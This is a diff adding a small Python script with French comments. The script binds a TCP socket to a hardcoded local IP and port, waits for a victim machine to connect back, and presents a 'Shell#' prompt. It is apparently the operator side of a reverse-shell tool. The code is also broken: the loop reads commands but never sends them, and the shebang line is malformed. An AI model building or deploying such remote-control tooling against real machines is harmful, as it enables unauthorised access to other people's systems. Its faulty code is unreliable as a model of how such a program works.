@@ -1,0 +1,36 @@
+#!usr/bin/python
+
+import socket
+from termcolor import colored
+
+localIP = "192.168.1.46"
+portbind = 54321
+
+
+def shell():
+	while True:
+		command = input("* Shell#~%s: " %str(ip))
+		if command == 'q':
+			break
+		else:
+			message = target.recv(1024)
+			print(message.decode('utf-8'))
+
+def server():
+	global s
+	global ip
+	global target
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ipv4 connection ; TCP connection
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #options pour le sokcet object
+
+	s.bind((localIP,portbind)) #ca va bind notre ip addresse locale vers le port specifie entre (), veririfer que le port n'est pas utilise
+	s.listen(5) #listen for incomming connexions, entre () le nombre
+
+	print(colored("[+] Listening for incoming connections", 'green'))
+
+	target, ip = s.accept() #on stocke la connexion, socket obj in target, ip stocke ip et port
+	print(colored("[+] Connection established from: %s" % str(ip), 'green'))
+
+server()
+shell()
+s.close()
